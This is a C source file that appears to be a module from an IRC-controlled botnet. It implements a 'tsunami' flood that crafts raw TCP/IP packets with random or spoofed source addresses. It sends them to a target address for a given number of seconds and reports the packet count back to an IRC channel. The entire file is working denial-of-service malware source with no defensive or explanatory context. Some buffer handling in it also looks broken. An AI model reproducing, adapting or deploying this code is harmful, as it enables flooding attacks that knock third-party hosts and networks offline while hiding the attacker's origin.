#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_TSUNAMI
struct kaiten_iphdr {
        unsigned int ihl:4, version:4;
        unsigned char tos;
        unsigned short tot_len;
        unsigned short id;
        unsigned short frag_off;
        unsigned char ttl;
        unsigned char protocol;
        unsigned short check;
        unsigned long saddr;
        unsigned long daddr;
};
struct kaiten_tcphdr {
        unsigned short source;
        unsigned short dest;
        unsigned long seq;
        unsigned long ack_seq;
        unsigned short res1:4, doff:4;
	unsigned char fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
        unsigned short window;
        unsigned short check;
        unsigned short urg_ptr;
};
struct send_tcp {
	struct kaiten_iphdr ip;
	struct kaiten_tcphdr tcp;
	char buf[20];
};
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
	char buf[20];
};

u_short kaiten_in_cksum(u_short *addr, int len) {
        register int nleft = len;         register u_short *w = addr;
        register int sum = 0;
        u_short answer =0;
        while (nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}

DWORD WINAPI TsunamiThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	TSUNAMI tsn = *((TSUNAMI *)param);
	TSUNAMI *tsns = (TSUNAMI *)param;
	tsns->gotinfo = TRUE;

	sprintf(sendbuf, "-\x03\x34\2tsunami\2\x03- Done with flood, %d packets sent.", Tsunami(tsn, finet_addr(tsn.ip), atoi(tsn.length)));

	if (!tsn.silent) irc_privmsg(tsn.sock, tsn.chan, sendbuf, tsn.notice); 
	addlog(sendbuf);

	clearthread(tsn.threadnum);

	ExitThread(0); 
}

unsigned long Tsunami(TSUNAMI tsn, unsigned long daddr, unsigned int secs)
{
		unsigned long packets = 0;
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int psize=1400, check;
        unsigned long saddr;
        SOCKET get;
		unsigned long start = GetTickCount();
        if ((get = fsocket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) return 0;
		SOCKADDR sa;
		int sas;
		char ip[32];
        srand(GetTickCount());
        memset(send_tcp.buf,brandom(1,9),psize);
        while (1) {
			if ((GetTickCount()-start)/1000>secs) break;
			if (!spoofing) 
			{
				sas = sizeof(sa);
				memset(&sa, 0, sizeof(sa));
				fgetsockname(tsn.sock, &sa, &sas);
				sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], brandom(1, 255));
			} else
				strcpy(ip, spoof);

                saddr=finet_addr(ip);
                send_tcp.ip.ihl = 5;
                send_tcp.ip.version = 4;
                send_tcp.ip.tos = 16;
                send_tcp.ip.tot_len = fhtons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.frag_off = 64;
                send_tcp.ip.ttl = 64;
                send_tcp.ip.protocol = 6;
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = rand();
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.doff = 5;
                send_tcp.tcp.res1 = 0;
                send_tcp.tcp.cwr = 0;
                send_tcp.tcp.ece = 0;
                send_tcp.tcp.urg = 0;
                send_tcp.tcp.ack = 1;
                send_tcp.tcp.psh = 1;
                send_tcp.tcp.rst = 0;
                send_tcp.tcp.fin = 0;
                send_tcp.tcp.syn = 0;
                send_tcp.tcp.window = 30845;
                send_tcp.tcp.check = 0;
                send_tcp.tcp.urg_ptr = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = kaiten_in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = kaiten_in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                memcpy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                memcpy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = kaiten_in_cksum((unsigned short *)&pseudo_header, 32+psize);
                fsendto(get, (const char *)&send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
				packets++;
        }
        fclosesocket(get);
        return packets;
}
#endif